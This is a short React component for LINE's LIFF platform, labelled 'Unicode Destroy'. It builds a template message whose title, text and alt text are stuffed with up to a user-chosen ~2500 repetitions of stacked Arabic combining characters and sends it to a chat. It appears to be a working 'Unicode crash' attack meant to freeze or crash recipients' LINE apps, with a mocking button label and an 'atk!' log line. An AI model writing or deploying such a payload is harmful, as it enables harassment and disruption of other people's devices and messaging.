import React, { useState } from "react";

export default function Send(props) {
  let liff = props.liff;

  let [data, setData] = useState({
    
  });

  function sendFlexUnicode() {
    console.log("atk!")
    let template = `
    [{"type": "template",   "altText": "{unicode}",   "template": {     "type": "buttons",     "thumbnailImageUrl": "https://amex.deno.dev/favicon.ico",     "imageAspectRatio": "rectangle",     "imageSize": "cover",     "imageBackgroundColor": "#000000",     "title": "{unicode}",     "text": "{unicode}",     "actions": [       {         "type": "uri",         "label": "m9(^Д^)ﾌﾟｷﾞｬｰ",         "uri": "https://Twitter.com/amex2189"       }   ]   } } ]
    `

    let unicode1 = "";

    let num = parseInt(prompt("長さ ~2500"));
    for (let i = 0;i < num;i++) {
        unicode1 += decodeURIComponent("%D9%8B%D9%99");
    }

    template = template.replaceAll("{unicode}", unicode1)

    liff.sendMessages(
        JSON.parse(template)
    )
  }

  return (
    <div>
        <t>Unicode Destroy</t>
        <t class="desc">Unicodeが制限された今でも使える新型Unicodeです。</t>
        1: <button onClick={() => {sendFlexUnicode()}}>Send</button>
    </div>
  );
}
